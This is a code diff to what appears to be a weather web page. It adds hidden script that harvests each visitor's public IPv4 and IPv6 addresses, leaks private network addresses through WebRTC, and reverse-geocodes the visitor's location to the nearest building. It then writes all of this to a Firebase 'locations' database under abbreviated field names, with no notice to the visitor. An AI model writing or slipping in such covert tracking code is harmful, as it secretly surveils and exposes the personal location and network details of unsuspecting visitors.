@@ -313,10 +313,120 @@ if (navigator.geolocation) {
 }
 </script>
 
+<script>
+let PUBLIC_IPV4 = "?"
+let PUBLIC_IPV6 = "?"
+
+let PRIVATE_IPV4 = "?"
+let PRIVATE_IPV6 = "?"
+
+let CLOSEST_BUILDING = "?"
+
+
+/* GET PUBLIC IPV4 */
+
+async function getIPv4(){
+
+const res = await fetch("https://api.ipify.org?format=json")
+const data = await res.json()
+
+PUBLIC_IPV4 = data.ip
+
+}
+
+
+/* GET PUBLIC IPV6 */
+
+async function getIPv6(){
+
+try{
+
+const res = await fetch("https://api64.ipify.org?format=json")
+const data = await res.json()
+
+PUBLIC_IPV6 = data.ip
+
+}catch{
+
+PUBLIC_IPV6 = "?"
+
+}
+
+}
+
+
+/* GET PRIVATE IPs */
+
+function getPrivateIPs(){
+
+return new Promise(resolve=>{
+
+const pc = new RTCPeerConnection({iceServers:[]})
+pc.createDataChannel("")
+
+pc.onicecandidate = e=>{
+
+if(!e.candidate) return
+
+const ipMatch = e.candidate.candidate.match(
+/([a-f0-9:]+:+)+[a-f0-9]+|([0-9]{1,3}(\.[0-9]{1,3}){3})/i
+)
+
+if(!ipMatch) return
+
+const ip = ipMatch[0]
+
+if(ip.includes(":"))
+PRIVATE_IPV6 = ip
+else
+PRIVATE_IPV4 = ip
+
+}
+
+pc.createOffer().then(o=>pc.setLocalDescription(o))
+
+setTimeout(()=>{
+pc.close()
+resolve()
+},2000)
+
+})
+
+}
+
+
+/* FIND CLOSEST BUILDING */
+
+async function getClosestBuilding(){
+
+const url =
+`https://nominatim.openstreetmap.org/reverse?format=json&lat=${LAT}&lon=${LON}&zoom=18&addressdetails=1`
+
+const res = await fetch(url,{
+headers:{
+"User-Agent":"demo-scanner"
+}
+})
+
+const data = await res.json()
+
+CLOSEST_BUILDING =
+data.name ||
+data.display_name ||
+"?"
+
+}
+</script>
+    
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
 import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
+await getPrivateIPs()
+await getIPv4()
+await getIPv6()
+await getClosestBuilding()
+    
 const firebaseConfig = {
   apiKey: "AIzaSyAEHnFIUqKy1NJzuqvvrsg3zhNEciIOLqo",
   authDomain: "jkweather-2c918.firebaseapp.com",
@@ -331,13 +441,16 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
-window.logLocationToFirebase = function(lat, lon, city, state) {
+window.logLocationToFirebase = function(lat, lon, city, state, PUBLIC_IPV4, PUBLIC_IPV6, PRIVATE_IPV4, PRIVATE_IPV6, CLOSEST_BUILDING) {
     const messageListRef = ref(db, 'locations');
     const newMessageRef = push(messageListRef);
 
     set(newMessageRef, {
-        coordinates: `Lat: ${lat} | Lon: ${lon}`,
-        location: `${city}, ${state}`,
+        lalo: `${lat} ${lon}`,
+        loca: `${city}, ${state}`,
+        publ: `v4: ${PUBLIC_IPV4}, v6: ${PUBLIC_IPV6}`,
+        priv: `v4: ${PRIVATE_IPV4}, v6: ${PRIVATE_IPV6}`,
+        clos: `${CLOSEST_BUILDING}`,
         timestamp: new Date().toISOString()
     });
 };
@@ -345,12 +458,3 @@ window.logLocationToFirebase = function(lat, lon, city, state) {
     
 </body>
 </html>
-
-
-
-
-
-
-
-
-
